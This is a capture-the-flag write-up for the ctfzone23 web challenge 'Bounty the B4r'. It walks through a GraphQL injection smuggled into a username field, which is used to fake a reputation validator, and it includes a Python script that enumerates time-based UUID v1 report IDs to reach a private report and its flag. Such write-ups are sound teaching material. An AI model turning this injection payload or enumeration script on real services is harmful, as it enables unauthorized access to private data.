---
title: "ctfzone23 web/Bounty the B4r"
publishDate: "13 Aug 2023"
description: "Author: cpp.dog"
tags: ["web", "ctfzone23"]
---

#### Description
BB stands for Bounty the B4r. Our highly skilled specialists developed the best BB platform ever with a magnificent UI design. We’re waiting for you to report cool findings and let us pay you some $$ or chocolate

#### Code inspection
Here's the most important code of our challenge.

`golang/db/database.go`
```golang
func (db Database) InitFlagReport(flag string) error {
  ...
	program := BBProgram{
		ID:   prUUID.String(),
		Name: "CTFZone Private Program",
		Type: ProgramTypePrivate,
	}

	res = db.Impl.Create(&program)
	if res.Error != nil || res.RowsAffected != 1 {
		return fmt.Errorf("error inserting program to the db: %v", res.Error)
	}

	_, err = db.CreateReport(
		"Very Secret Report~",
		"Flag: "+flag,
		program.ID,
		"Critical",
		"CWE-1",
		7446744073709551610,
	)
  ...
}
```

`golang/controller/program.go`
```golang
func (s *server) PostProgramPUuidJoin(w http.ResponseWriter, r *http.Request, pUuid uuid.UUID) {
	...
	if bbProgram.Type == ProgramTypePrivate && user.Reputation < 100000 {
		api.HandleError(fmt.Errorf("low reputation, try harder"), w)
		return
	}
  ...
}
```

`golang/controller/report.go`
```golang
func (s *server) GetReportRUuid(w http.ResponseWriter, r *http.Request, rUuid uuid.UUID, params api.GetReportRUuidParams) {
  ...
	if bbProgram.Type == ProgramTypePrivate {
		var progMembers db.ProgramMembers
		result = s.db.Impl.First(&progMembers, "user_id = ? AND program_id = ?", userID, bbProgram.ID)
		if result.Error != nil || result.RowsAffected != 1 {
			api.HandleError(fmt.Errorf("you're not a member of this program"), w)
			return
		}
	}
  ...
}
```
`golang/controller/user.go`
```golang
const userDataQery = `query {
	user(username: "%s") {
	  id
	  username
	  name
	  intro
	  reputation
	  rank
	}
}`
...
func verifyValidator(v string) bool {
	m, err := regexp.MatchString("^[a-zA-Z0-9=]{30,40}$", v)
	if err != nil {
		return false
	}
	if m {
		return true
	} else {
		return false
	}
}

func (s *server) PostUserImportReputation(w http.ResponseWriter, r *http.Request) {
  ...
  postBody, _ := json.Marshal(map[string]string{
      "query": fmt.Sprintf(userDataQery, *req.Username),
  })
  resp, err := http.Post("https://hackerone.com/graphql", "application/json", bytes.NewBuffer(postBody))
  ...
  if rd.Data.User.Intro != *req.Validator {
      api.HandleError(fmt.Errorf("incorrect validator"), w)
      return
  }
```
Looks like we need to abuse GraphQL injection for something, let's take a look at hackerone's response for a random h1 user.

```bash
curl -X POST -d `{"query": "query { user(username: \"d0xing\") { id username name intro reputation rank } }"}` -H "Content-Type: application/json" https://hackerone.com/graphql


{
    "data": {
        "user": {
            "id": "Z2lkOi8vaGFja2Vyb25lL1VzZXIvOTY1NTA=",
            "username": "d0xing",
            "name": "d0xing",
            "intro": "",
            "reputation": 103907,
            "rank": 2
        }
    }
}
```

The `id` field looks like it can be used as a `validator`, so we can abuse this to get 100k rating on the target site. 

```bash
curl -X POST -d '{
    "username":"d0xing\") { intro:id username reputation rank } u:user(username: \"d0xing", 
    "validator": "Z2lkOi8vaGFja2Vyb25lL1VzZXIvOTY1NTA="
  }' \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer [REDACTED]" \
  https://bounty-the-b4r.ctfz.one/api/user/import_reputation
```

Now we can join `CTFZone Private Program` program without problems. Our new task is to find the report id. The only thing we know is the uuid of programs, and the time report was generated.

```json
[
    {
        "id": "ad1cec14-3830-11ee-b365-0255ac100030",
        "name": "CTFZone Private Program",
        "programType": 1
    },
    {
        "id": "ad1d822a-3830-11ee-b365-0255ac100030",
        "name": "Hooli Public BB Program",
        "programType": 0
    }
]

{
    "published": 1691749220902427748,
    "severity": "Critical",
    "title": "Very Secret Report~"
}
```
So, we need to iterate over the v1 uuid between `ad1cec14-3830-11ee-b365-0255ac100030` and `ad1d822a-3830-11ee-b365-0255ac100030`, but checking each id is not possible due to proof of work. Let's check how uuids are created. 

```golang
// A Time represents a time as the number of 100's of nanoseconds since 15 Oct 1582.
timeLow := uint32(now & 0xffffffff)
```

Since we know the report creation time in nanoseconds, we can easily reduce the search range. 

Corresponding uuid v1: `ad1cec14-3830-11ee-b365-0255ac100030`. Now we are ready to get the flag.

#### Solver code
```python
import hashlib
import requests
import json

ALPHABET = "".join([chr(i) for i in range(32, 128)])

FROM_UUID = int("ad1cec14", base=16)
TO_UUID = int("ad1d822a", base=16)
SUFFIX = "-3830-11ee-b365-0255ac100030"

def get_pow(pref, hash): 
  for c in ALPHABET:
    for c1 in ALPHABET:
        for c2 in ALPHABET:
            for c3 in ALPHABET:
                if hashlib.md5((pref + c + c1 + c2 + c3).encode()).hexdigest() == hash:
                    return (pref + c + c1 + c2 + c3)
  return None
for N in range(FROM_UUID, TO_UUID):
  s = requests.get("https://bounty-the-b4r.ctfz.one/api/user/info", headers={
    "Authorization": "Bearer [REDACTED]"
  })
  data = s.json()

  pow = get_pow(data["pow"], data["md5"])

  url = f"https://bounty-the-b4r.ctfz.one/api/report/{hex(N)[2:]}{SUFFIX}?pow={pow}"
  print(f"Trying {url}...")

  r = requests.get(url, headers={
    "Authorization": "Bearer [REDACTED]"
  })

  if r.status_code == 400:
    continue

  print(json.dumps(r.json(), indent=4, sort_keys=True))
```

#### Flag
`CTFZone{b0un7y_th3_b4r_th3_t4st3_0f_bug5}`